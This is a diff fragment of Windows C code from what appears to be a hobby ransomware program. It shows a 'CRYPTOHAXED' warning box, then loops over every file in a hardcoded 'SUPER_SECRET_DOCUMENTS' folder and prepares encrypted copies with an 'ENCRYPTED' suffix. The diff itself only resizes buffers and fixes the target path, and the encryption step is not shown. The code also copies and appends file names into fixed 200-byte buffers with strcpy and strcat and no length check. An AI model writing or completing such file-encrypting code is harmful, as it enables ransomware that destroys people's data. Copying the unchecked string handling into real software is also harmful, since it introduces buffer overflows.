@@ -26,15 +26,15 @@ void MyHandleError(
 int _tmain(int argc, _TCHAR* argv[]) {
 HANDLE hFind;
 WIN32_FIND_DATA data;
-char * infileName = (char*)malloc(150);
-char * outfileName = (char*)malloc(150);
+char * infileName = (char*)malloc(200);
+char * outfileName = (char*)malloc(200);
 	MessageBox(NULL, "GET READY TO GET CRYPTOHAXED\n",NULL, NULL);
 	hFind = FindFirstFile("C:\\Users\\eugene\\Desktop\\Code\\Charlie2\\Charlie-2\\SUPER_SECRET_DOCUMENTS\\*.*", &data);
 	if (hFind != INVALID_HANDLE_VALUE) {
 	  do {
 	  	if (strcmp(data.cFileName,".") != 0 && strcmp(data.cFileName,"..") != 0) {
-	  		strcpy(infileName, "C:\\Users\\eugene\\Desktop\\SUPER_SECRET_DOCUMENTS\\");
-	  		strcpy(outfileName, "C:\\Users\\eugene\\Desktop\\SUPER_SECRET_DOCUMENTS\\");
+	  		strcpy(infileName, "C:\\Users\\eugene\\Desktop\\Code\\Charlie2\\Charlie-2\\SUPER_SECRET_DOCUMENTS\\");
+	  		strcpy(outfileName, "C:\\Users\\eugene\\Desktop\\Code\\Charlie2\\Charlie-2\\SUPER_SECRET_DOCUMENTS\\");
 	  		infileName = strcat(infileName, data.cFileName);
 	  		outfileName = strcat(outfileName, data.cFileName);
 	  		outfileName = strcat(outfileName, "ENCRYPTED");
